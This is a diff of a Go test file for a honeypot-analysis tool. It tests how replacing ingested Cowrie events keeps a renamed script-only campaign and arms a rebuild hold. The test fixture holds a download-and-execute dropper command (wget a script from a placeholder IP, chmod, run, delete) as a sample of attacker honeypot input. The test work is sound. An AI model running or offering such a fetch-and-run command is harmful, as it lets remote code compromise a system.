@@ -190,6 +190,106 @@ func TestScriptRebuildReleaseMovesRowToMajority(t *testing.T) {
 	}
 }
 
+// twoSessionEvents is the --replace fixture: one distinctive script run in
+// two sessions by two actors, so a script-only campaign forms. Calling it
+// again yields the same events, as re-ingesting the same file does.
+func twoSessionEvents(at time.Time) []*models.Event {
+	const cmd = "cd /tmp; wget http://198.51.100.9/a.sh; chmod +x a.sh; ./a.sh; rm -f a.sh"
+	var out []*models.Event
+	for i, a := range []string{"cowrie:a", "cowrie:b"} {
+		out = append(out, &models.Event{TS: at, Source: models.SourceCowrie, Kind: models.KindCommand, SrcIP: "198.51.100.1",
+			SessionID: fmt.Sprintf("s%d", i), ActorID: a, Command: cmd})
+	}
+	return out
+}
+
+// settledScriptCampaign records twoSessionEvents and stores what an older
+// normaliser left behind: both sessions settled to OLD, and a renamed
+// script-only campaign c-keep owning OLD in campaign_ids.
+func settledScriptCampaign(t *testing.T, s *Store, at time.Time) {
+	t.Helper()
+	for _, e := range twoSessionEvents(at) {
+		if err := s.InsertEvent(e); err != nil {
+			t.Fatal(err)
+		}
+	}
+	if _, err := s.RecordCampaignEvidence(context.Background(), 5000); err != nil {
+		t.Fatal(err)
+	}
+	ts := formatFixedUTC(at)
+	for _, q := range []string{
+		`UPDATE session_scripts SET fingerprint='OLD', settled_at='` + ts + `'`,
+		`INSERT INTO campaign_ids(kind,value,campaign_id,seq) VALUES('script','OLD','c-keep',1)`,
+		`INSERT INTO campaigns(id,name,updated_at) VALUES('c-keep','Keep','` + ts + `')`,
+		`INSERT INTO campaign_edits(campaign_id,action,arg,created_at) VALUES('c-keep','rename','Keep','` + ts + `')`,
+	} {
+		if _, err := s.db.Exec(q); err != nil {
+			t.Fatal(err)
+		}
+	}
+}
+
+// A Cowrie --replace with no rebuild hold active must arm one (pipeline
+// audit I1). The replace deletes every session_scripts row, and a
+// re-recorded session cannot settle for settleIdle (10 minutes of
+// ingest-time idleness), so for that long there is no settled script
+// anywhere; nothing else suppressed regroups, and the worker regroups as soon
+// as the backlog drains. Group keeps an assignment only for a value with an
+// occurrence, so that regroup replaced campaign_ids without the script rows
+// and, when the sessions settled, minted a fresh ID: the renamed campaign was
+// left a named, empty shell (prod carries a script-only renamed campaign, so
+// one documented CLI command lost it). ssh_key and payload evidence were
+// never affected: the recorder re-creates them in the first windows. Here the
+// old fingerprint differs from the one the sessions settle to, so the row
+// survives only if the replace also snapshotted the carry.
+func TestReplaceWithoutHoldArmsRebuildHold(t *testing.T) {
+	s := newTestStore(t, "replace-no-hold.db")
+	ctx := context.Background()
+	at := time.Now().UTC().Add(-time.Hour)
+	settledScriptCampaign(t, s, at)
+	if held, err := s.ScriptRebuildHold(ctx, time.Now()); err != nil || held {
+		t.Fatalf("precondition: a hold is active (held=%v err=%v)", held, err)
+	}
+	// `shardlure ingest cowrie <the same file> --replace`.
+	if err := s.ReplaceSourceEventsAndActorsAgg(models.SourceCowrie, twoSessionEvents(at), nil); err != nil {
+		t.Fatal(err)
+	}
+	// The daemon's next tick drains the re-inserted rows, then asks the hold.
+	for i := 0; i < 5; i++ {
+		if _, err := s.RecordCampaignEvidence(ctx, 5000); err != nil {
+			t.Fatal(err)
+		}
+	}
+	if held, err := s.ScriptRebuildHold(ctx, time.Now()); err != nil || !held {
+		t.Fatalf("after a --replace with no hold active: held=%v err=%v; the re-recorded sessions cannot have settled yet, so the drain's regroup drops c-keep's script row", held, err)
+	}
+	var carried int
+	if err := s.db.QueryRow(`SELECT COUNT(*) FROM script_version_carry`).Scan(&carried); err != nil || carried != 2 {
+		t.Fatalf("carry snapshot after the replace = %d rows, %v; want both settled sessions", carried, err)
+	}
+	// Ten minutes pass: the sessions settle to the current fingerprint.
+	if n, err := s.SettleSessionScripts(ctx, time.Now().Add(time.Minute), 10); err != nil || n != 2 {
+		t.Fatalf("settle %d %v", n, err)
+	}
+	if held, err := s.ScriptRebuildHold(ctx, time.Now()); err != nil || held {
+		t.Fatalf("settled: held=%v err=%v", held, err)
+	}
+	var fp, value, id, name string
+	s.db.QueryRow(`SELECT fingerprint FROM session_scripts WHERE session_id='s0'`).Scan(&fp)
+	if err := s.db.QueryRow(`SELECT value, campaign_id FROM campaign_ids WHERE kind='script'`).Scan(&value, &id); err != nil || value != fp || id != "c-keep" {
+		t.Fatalf("script row %s -> %s (%v), want %s -> c-keep", value, id, err, fp)
+	}
+	if err := s.db.QueryRow(`SELECT name FROM campaigns WHERE id='c-keep'`).Scan(&name); err != nil || name != "Keep" {
+		t.Fatalf("renamed campaign %q %v", name, err)
+	}
+	var holds int
+	s.db.QueryRow(`SELECT COUNT(*) FROM ingest_state WHERE source='script_version' AND path<>'normaliser'`).Scan(&holds)
+	s.db.QueryRow(`SELECT COUNT(*) FROM script_version_carry`).Scan(&carried)
+	if holds != 0 || carried != 0 {
+		t.Fatalf("after the release: %d hold rows, %d carry rows", holds, carried)
+	}
+}
+
 // A Cowrie --replace during a rebuild hold must not release it. The replace
 // parks the recorder at the pre-delete maximum id, which is past the hold's
 // high-water mark, so the next check found nothing pending, released, and
@@ -202,36 +302,8 @@ func TestReplaceDuringRebuildHoldKeepsCarry(t *testing.T) {
 	s := newTestStore(t, "hold-replace.db")
 	ctx := context.Background()
 	at := time.Now().UTC().Add(-time.Hour)
-	const cmd = "cd /tmp; wget http://198.51.100.9/a.sh; chmod +x a.sh; ./a.sh; rm -f a.sh"
-	events := func() []*models.Event {
-		var out []*models.Event
-		for i, a := range []string{"cowrie:a", "cowrie:b"} {
-			out = append(out, &models.Event{TS: at, Source: models.SourceCowrie, Kind: models.KindCommand, SrcIP: "198.51.100.1",
-				SessionID: fmt.Sprintf("s%d", i), ActorID: a, Command: cmd})
-		}
-		return out
-	}
-	for _, e := range events() {
-		if err := s.InsertEvent(e); err != nil {
-			t.Fatal(err)
-		}
-	}
-	if _, err := s.RecordCampaignEvidence(ctx, 5000); err != nil {
-		t.Fatal(err)
-	}
-	// What an older normaliser left: both sessions settled to OLD, and a
-	// renamed script-only campaign owning OLD.
-	ts := formatFixedUTC(at)
-	for _, q := range []string{
-		`UPDATE session_scripts SET fingerprint='OLD', settled_at='` + ts + `'`,
-		`INSERT INTO campaign_ids(kind,value,campaign_id,seq) VALUES('script','OLD','c-keep',1)`,
-		`INSERT INTO campaigns(id,name,updated_at) VALUES('c-keep','Keep','` + ts + `')`,
-		`INSERT INTO campaign_edits(campaign_id,action,arg,created_at) VALUES('c-keep','rename','Keep','` + ts + `')`,
-	} {
-		if _, err := s.db.Exec(q); err != nil {
-			t.Fatal(err)
-		}
-	}
+	events := func() []*models.Event { return twoSessionEvents(at) }
+	settledScriptCampaign(t, s, at)
 	if reset, err := s.ResetScriptsForVersion(ctx, 99); err != nil || !reset {
 		t.Fatalf("reset=%v err=%v", reset, err)
 	}
@@ -290,14 +362,21 @@ func TestReplaceDuringRebuildHoldKeepsCarry(t *testing.T) {
 	if err := s.db.QueryRow(`SELECT name FROM campaigns WHERE id='c-keep'`).Scan(&name); err != nil || name != "Keep" {
 		t.Fatalf("renamed campaign %q %v", name, err)
 	}
-	// Without an active hold a --replace creates none.
+	// A --replace outside a hold arms one of its own (pipeline audit I1,
+	// TestReplaceWithoutHoldArmsRebuildHold): the re-measure sentinel, no
+	// deadline anchor, and a carry snapshot of the two settled sessions.
 	if err := s.ReplaceSourceEventsAndActorsAgg(models.SourceCowrie, events(), nil); err != nil {
 		t.Fatal(err)
 	}
-	var holds int
-	s.db.QueryRow(`SELECT COUNT(*) FROM ingest_state WHERE source='script_version' AND path<>'normaliser'`).Scan(&holds)
-	if holds != 0 {
-		t.Fatalf("a replace outside a hold wrote %d hold rows", holds)
+	if hwm, ok := holdRow("hold_hwm"); !ok || hwm != scriptHoldRemeasure {
+		t.Fatalf("after a replace outside a hold: hold_hwm = %d (present %v), want the sentinel %d", hwm, ok, scriptHoldRemeasure)
+	}
+	if _, ok := holdRow("hold_deadline"); ok {
+		t.Fatal("a replace outside a hold wrote a deadline anchor")
+	}
+	var carried int
+	if err := s.db.QueryRow(`SELECT COUNT(*) FROM script_version_carry`).Scan(&carried); err != nil || carried != 2 {
+		t.Fatalf("carry after a replace outside a hold = %d rows, %v; want the two settled sessions", carried, err)
 	}
 }
 
